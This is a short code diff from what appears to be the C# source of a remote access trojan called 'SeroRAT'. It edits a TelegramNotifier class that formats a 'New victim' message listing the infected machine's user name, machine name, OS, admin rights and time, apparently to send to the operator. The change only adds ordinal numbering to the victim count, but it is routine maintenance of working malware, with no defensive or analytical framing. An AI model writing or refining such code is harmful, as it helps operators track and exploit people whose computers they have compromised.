@@ -223,7 +223,7 @@ internal static class TelegramNotifier
         var dt       = paris.ToString("yyyy-MM-dd HH:mm") + " (Paris)";
 
         return
-            $"New victim #{count} - SeroRAT\n" +
+            $"New victim {ToOrdinal(count)} - SeroRAT\n" +
             $"\n" +
             $"ID: {clientId}\n" +
             $"User: {Environment.UserName}@{Environment.MachineName}\n" +
@@ -234,6 +234,16 @@ internal static class TelegramNotifier
             $"OS: {GetOsName()}\n" +
             $"Admin: {admin}\n" +
             $"Time: {dt}";
+    }
+
+    private static string ToOrdinal(int n)
+    {
+        string suffix = (n % 100) switch
+        {
+            11 or 12 or 13 => "th",
+            _ => (n % 10) switch { 1 => "st", 2 => "nd", 3 => "rd", _ => "th" }
+        };
+        return $"{n}{suffix}";
     }
 
     // GET request with URL-encoded plain text — no parse_mode, no markdown, no 400 errors
